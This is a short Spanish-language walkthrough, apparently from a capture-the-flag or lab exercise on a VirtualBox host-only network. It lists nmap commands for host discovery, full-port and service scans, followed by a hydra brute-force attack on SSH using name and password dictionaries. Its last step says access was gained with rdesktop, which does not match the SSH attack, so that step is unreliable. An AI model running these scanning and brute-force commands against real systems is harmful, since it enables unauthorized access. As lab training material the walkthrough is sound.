User.txt
Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
    - ifconfig

Empezamos escaneado la red con nmap:
    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
 
Vemos que el puerto 22 esta abierto y con el servicio ssh. Probamos hacer un ataque de fuerza bruta a este servicio:
    - Utilizar los siguientes diccionarios -> ./diccionarios/names.txt y ./diccionarios/passwords.txt 

    - hydra -L names.txt -P passwords.txt ssh://IP

Y encontramos una credencial valida. Nos conectamos con rdesktop y ya hemos hecho la intrusión.